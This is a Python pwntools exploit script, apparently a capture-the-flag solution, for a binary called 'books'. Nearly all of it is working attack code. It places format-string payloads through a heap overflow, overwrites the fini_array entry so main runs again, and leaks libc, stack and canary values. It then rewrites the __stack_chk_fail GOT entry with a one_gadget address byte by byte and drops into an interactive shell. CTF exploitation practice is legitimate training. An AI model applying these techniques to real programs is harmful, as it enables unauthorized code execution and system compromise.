#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./books"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
# libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("5: Submit\n",str(idx))

def add1(content):
    opt(1)
    p.sendlineafter("Enter first order:\n",str(content))

def add2(content):
    opt(2)
    p.sendlineafter("Enter second order:\n",str(content))

def free1():
    opt(3)

def free2():
    opt(4)

def submit(payload):
    opt("5" + str(payload))

def opt5():
    opt("5")

fini_array = 0x6011B8 # 0x400830
main_addr = 0x400A39

payload = flat([
    ("%"+str(2617)+"c%13$hn"  + '.%31$p' + ',%28$p,%29$p').ljust(0x80,"a")
    ],
    [
        "b"*8,0x151
        ]
    )
free2()
add1(payload)
gdb.attach(p,"set $h1=0x602000,$h2=0x602090,$h3=0x602120\nb *0x400c8e")
payload2 = '5'+"\0"*7 + p64(fini_array)
p.sendline(payload2)
p.recvuntil("\x20\x20\x00\x2e")

libc_start_main = int(p.recv(14),16)
offset = 0x20840
libc_base = libc_start_main - offset
one_offset = 0x4527a
one_gadget = libc_base + one_offset
log.success("one_gadget addr -> " + hex( one_gadget ))

p.recv(1)
leak_stack = int(p.recv(14),16)
log.success("leak stack addr -> " + hex(leak_stack))
ret1 = leak_stack - 0x118
ret2 = ret1+1

###
target = elf.got["__stack_chk_fail"]
###

p.recv(1)
canary = int(p.recv(18),16)
log.success("canary addr -> " + hex(canary))

free2()
payload = flat([
    ("%12c%14$hhn%88c%15$hhn%5c%16$hhn%38c%17$hhn%82c%18$hhn%8c%19$hhn").ljust(0x80,"a")
    ],
    [
        "b"*8,0x151
        ]
    )
add1(payload)
payload2 = '5'+"\0"*7 + p64(target+1)+ p64(target)+ p64(target+5)+ p64(target+2)+ p64(target+3)+ p64(target+4)
p.sendline(payload2)

p.interactive()
